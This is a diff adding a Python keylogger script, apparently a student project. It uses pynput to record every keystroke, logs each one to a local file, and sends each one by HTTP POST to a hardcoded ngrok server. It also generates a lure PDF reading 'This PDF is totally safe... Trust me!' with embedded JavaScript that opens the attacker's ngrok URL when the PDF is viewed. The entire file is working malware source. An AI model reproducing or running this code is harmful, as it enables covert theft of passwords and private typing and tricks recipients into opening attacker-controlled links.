@@ -1,0 +1,84 @@
+import os
+import requests
+from pynput import keyboard
+from reportlab.pdfgen import canvas
+from reportlab.lib.pagesizes import letter
+from PyPDF2 import PdfReader, PdfWriter
+from io import BytesIO
+
+LOG_FILE = "keylogs.txt"
+SERVER_URL = "https://f33f-31-205-78-116.ngrok-free.app"  # Replace with your Ngrok public URL
+
+# Function to send the keystrokes to the server
+def send_keystroke_to_server(keystroke):
+    try:
+        data = {'keystroke': keystroke}
+        r = requests.post(SERVER_URL, data=data)
+        if r.status_code != 200:
+            print(f"Failed to send keystroke. Status code: {r.status_code}")
+    except Exception as e:
+        print(f"Error sending keystroke: {e}")
+
+# Function to log keystrokes
+def on_press(key):
+    try:
+        keystroke = f"{key.char}\n"
+        with open(LOG_FILE, "a") as f:
+            f.write(keystroke)
+        send_keystroke_to_server(keystroke)  # Send the keystroke to the server
+    except AttributeError:
+        keystroke = f"{key}\n"
+        with open(LOG_FILE, "a") as f:
+            f.write(keystroke)
+        send_keystroke_to_server(keystroke)  # Send the keystroke to the server
+
+# Function to start the keylogger
+def start_keylogger():
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+# Function to create a PDF with embedded JavaScript
+def create_pdf_with_js():
+    # Define directory and file paths
+    pdf_dir = r"C:\Users\LJMU Recycled Kit\OneDrive - Liverpool John Moores University\Desktop\Keyloggers\pdf2"
+    os.makedirs(pdf_dir, exist_ok=True)
+    pdf_file = os.path.join(pdf_dir, "PDF.pdf")
+
+    # Create a PDF in memory
+    packet = BytesIO()
+    can = canvas.Canvas(packet, pagesize=letter)
+    can.drawString(100, 750, "This PDF is totally safe... Trust me!")
+    can.save()
+
+    # Move to the beginning of the BytesIO buffer
+    packet.seek(0)
+
+    # Read the PDF created by ReportLab
+    new_pdf = PdfReader(packet)
+
+    # Create a PdfWriter object and add the new PDF page
+    output_pdf = PdfWriter()
+    output_pdf.add_page(new_pdf.pages[0])
+
+    # Replace '<YOUR_NGROK_URL>' with Ngrok URL
+    ngrok_url = 'https://f33f-31-205-78-116.ngrok-free.app'  # Replace this with your Ngrok URL
+
+    # Create JavaScript to open a URL
+    js = f"""
+    app.launchURL('{ngrok_url}', true);  # JavaScript to launch the specified URL when the PDF is opened
+    """
+
+    # Add JavaScript to the PDF
+    output_pdf.add_js(js)
+
+    # Write the final PDF to a file
+    with open(pdf_file, "wb") as f:
+        output_pdf.write(f)
+
+# Main function to run the keylogger and create the PDF
+def main():
+    create_pdf_with_js()
+    start_keylogger()
+
+if __name__ == "__main__":
+    main()
